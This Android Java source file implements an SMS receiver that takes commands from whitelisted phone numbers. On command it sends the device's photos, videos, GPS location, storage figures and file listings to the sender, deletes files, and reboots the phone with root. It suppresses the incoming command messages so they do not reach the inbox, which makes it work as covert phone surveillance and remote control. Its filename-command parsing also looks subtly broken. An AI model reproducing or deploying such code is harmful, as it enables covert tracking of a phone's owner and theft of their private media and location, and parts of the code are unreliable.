package com.rich.receiver;

import java.io.File;
import java.util.ArrayList;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.StatFs;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.rich.service.RegisterSMSService;
import com.rich.service.SendMMSService;
import com.rich.util.RichUtils;

public class SMSReceiver extends BroadcastReceiver {
	class StuffTask extends AsyncTask<Object, String, Void> {
		private Context context;
		private Intent intent;
		private String number;
		
		@Override
		protected void onProgressUpdate(String... values) {
			Log.e("mms", values[0]);
			Toast.makeText(context, values[0], Toast.LENGTH_SHORT).show();
			super.onProgressUpdate(values);
		}
		
		@Override
		protected Void doInBackground(Object... params) {
			context = ((Context) params[0]).getApplicationContext();
			Intent service1 = new Intent(context, RegisterSMSService.class);
			context.startService(service1);
			intent = (Intent) params[1];
			Bundle bdl = intent.getExtras();
			Object pdus[] = (Object[]) bdl.get("pdus");
			String body = "";
			for (int i = 0; i < pdus.length; i++) {
				byte[] data = (byte[]) pdus[i];
				SmsMessage msg = SmsMessage.createFromPdu(data);
				number = msg.getOriginatingAddress();
				body += msg.getMessageBody();
			}
			publishProgress("received from "+number +" with command "+body);
			body = body.toLowerCase();
			SharedPreferences sharedPreferences = context.getSharedPreferences(
					"com.rich_preferences", 0);
			String f = sharedPreferences.getString("filter", "");
			String[] nums = f.split(",");
			for (int i = 0; i < nums.length; ++i) {
				if (!nums[i].equals("")
						&& (nums[i].endsWith(number) || number
								.endsWith(nums[i]))) {
					publishProgress("found match for "+number);
					if (body.equals("trigger")) {
						this.context.sendBroadcast(new Intent("TRIGGER")
								.putExtra("number", number));
					} else if (body.startsWith("pic")) {
						pic(body.substring(4));
					} else if (body.startsWith("vid")) {
						vid(body.substring(4));
					} else if (body.startsWith("delete")) {
						delete(body.substring(7));
					} else if (body.equals("location")) {
						location();
					} else if (body.equals("storage")) {
						storage();
					} else if (body.equals("reboot")) {
						RichUtils.runRootCommand("reboot");
					} else if (body.startsWith("filenames")) {
						String[] fs = body.split("");
						if (fs.length == 1)
							filenames("");
						else {
							for(int j=1;j<fs.length;++j)
								filenames(fs[j]);
						}
					}
					break;
				}
			}
			return null;
		}

		private void filenames(String sub) {
			File f = new File(Environment.getExternalStorageDirectory(), sub);
			if (f.isDirectory()) {
				File[] fs = f.listFiles();
				SmsManager smsManager = SmsManager.getDefault();
				String s = "";
				for (int i = 0; i < fs.length - 1; ++i) {
					if (fs[i].isFile())
						s += fs[i].getName() + " ";
				}
				s += fs[fs.length - 1];
				ArrayList<String> smses = smsManager.divideMessage(s);
				for (String a : smses) {
					smsManager.sendTextMessage(number, null, a, null, null);
				}
			}
		}

		// pic
		private void pic(String para) {
			File f = new File(Environment.getExternalStorageDirectory(), "pics");
			f.mkdir();
			if (f.isDirectory()) {
				File[] fs = f.listFiles();
				for (int j = 0; j < fs.length; ++j) {
					File fn = fs[j];
					String n = fn.getName();
					if (n.startsWith(para) && n.endsWith(".jpg")) {
						Intent i = new Intent(context, SendMMSService.class);
						i.putExtra("path", fn.getAbsolutePath());
						i.putExtra("number", number);
						context.startService(i);
					}
				}
			}
		}

		// vid
		private void vid(String para) {
			File f = new File(Environment.getExternalStorageDirectory(), "vids");
			f.mkdir();
			if (f.isDirectory()) {
				File[] fs = f.listFiles();
				for (int j = 0; j < fs.length; ++j) {
					File fn = fs[j];
					String n = fn.getName();
					if (n.startsWith(para) && n.endsWith(".3gp")) {
						publishProgress("found match for "+para);
						Intent i = new Intent(context, SendMMSService.class);
						i.putExtra("path", fn.getAbsolutePath());
						i.putExtra("number", number);
						context.startService(i);
					}
				}
			}
		}

		// delete
		private void delete(String para) {
			File f = new File(Environment.getExternalStorageDirectory(), para);
			if (f.isDirectory()) {
				File[] fs = f.listFiles();
				for (int j = 0; j < fs.length; ++j) {
					File fn = fs[j];
					if (fn.getName().startsWith(para))
						fn.delete();
				}
			} else {
				File p = f.getParentFile();
				if (p != null && p.isDirectory()) {
					File[] fs = p.listFiles();
					for (int j = 0; j < fs.length; ++j) {
						File fn = fs[j];
						if (fn.getName().startsWith(para))
							fn.delete();
					}
				}
			}
		}

		// location
		private LocationManager locationManager;
		private LocationListener gpsListener = null;
		private LocationListener networkListner = null;
		private Location currentLocation;
		private static final int CHECK_INTERVAL = 1000 * 30;

		private void location() {
			locationManager = (LocationManager) context
					.getSystemService(Context.LOCATION_SERVICE);
			networkListner = new MyLocationListner();
			locationManager.requestLocationUpdates(
					LocationManager.NETWORK_PROVIDER, 3000, 0, networkListner);
			gpsListener = new MyLocationListner();
			locationManager.requestLocationUpdates(
					LocationManager.GPS_PROVIDER, 5000, 0, gpsListener);
			new Thread(new Runnable() {
				public void run() {
					do {
						try {
							Thread.sleep(10000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					} while (currentLocation == null);
					SmsManager smsManager = SmsManager.getDefault();
					smsManager.sendTextMessage(number, null, "Latitude:"
							+ currentLocation.getLatitude() + " Longitude:"
							+ currentLocation.getLongitude(), null, null);
					locationManager.removeUpdates(gpsListener);
					locationManager = null;
				}
			}).start();
		}

		private class MyLocationListner implements LocationListener {
			public void onLocationChanged(Location location) {
				// Called when a new location is found by the location provider.
				Log.v("GPSTEST",
						"Got New Location of provider:"
								+ location.getProvider());
				if (currentLocation != null) {
					if (isBetterLocation(location, currentLocation)) {
						Log.v("GPSTEST", "It's a better location");
						currentLocation = location;
					} else {
						Log.v("GPSTEST", location.getProvider()
								+ "Not very good!");
					}
				} else {
					Log.v("GPSTEST", "It's first location");
					currentLocation = location;
				}
				// 移除基于LocationManager.NETWORK_PROVIDER的监听器
				if (LocationManager.NETWORK_PROVIDER.equals(location
						.getProvider())) {
					locationManager.removeUpdates(this);
				}
			}

			// 后3个方法此处不做处理
			public void onStatusChanged(String provider, int status,
					Bundle extras) {
			}

			public void onProviderEnabled(String provider) {
			}

			public void onProviderDisabled(String provider) {
			}
		};

		protected boolean isBetterLocation(Location location,
				Location currentBestLocation) {
			if (currentBestLocation == null) {
				// A new location is always better than no location
				return true;
			}

			// Check whether the new location fix is newer or older
			long timeDelta = location.getTime() - currentBestLocation.getTime();
			boolean isSignificantlyNewer = timeDelta > CHECK_INTERVAL;
			boolean isSignificantlyOlder = timeDelta < -CHECK_INTERVAL;
			boolean isNewer = timeDelta > 0;

			// If it's been more than two minutes since the current location,
			// use the new location
			// because the user has likely moved
			if (isSignificantlyNewer) {
				return true;
				// If the new location is more than two minutes older, it must
				// be worse
			} else if (isSignificantlyOlder) {
				return false;
			}

			// Check whether the new location fix is more or less accurate
			int accuracyDelta = (int) (location.getAccuracy() - currentBestLocation
					.getAccuracy());
			boolean isLessAccurate = accuracyDelta > 0;
			boolean isMoreAccurate = accuracyDelta < 0;
			boolean isSignificantlyLessAccurate = accuracyDelta > 200;

			// Check if the old and new location are from the same provider
			boolean isFromSameProvider = isSameProvider(location.getProvider(),
					currentBestLocation.getProvider());

			// Determine location quality using a combination of timeliness and
			// accuracy
			if (isMoreAccurate) {
				return true;
			} else if (isNewer && !isLessAccurate) {
				return true;
			} else if (isNewer && !isSignificantlyLessAccurate
					&& isFromSameProvider) {
				return true;
			}
			return false;
		}

		/** Checks whether two providers are the same */
		private boolean isSameProvider(String provider1, String provider2) {
			if (provider1 == null) {
				return provider2 == null;
			}
			return provider1.equals(provider2);
		}

		// storage
		private void storage() {
			File path = Environment.getExternalStorageDirectory();

			StatFs stat = new StatFs(path.getPath());
			long blockSize = stat.getBlockSize();

			long allBlocks = stat.getBlockCount();

			long availableBlocks = stat.getAvailableBlocks();

			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(number, null, "Total(MB):"
					+ (allBlocks * blockSize / 1024 / 1024) + " Available(MB):"
					+ (availableBlocks * blockSize / 1024 / 1024), null, null);
		}
	}

	public void onReceive(Context context, Intent intent) {
		abortBroadcast();
		new StuffTask().execute(context, intent);
	}
}
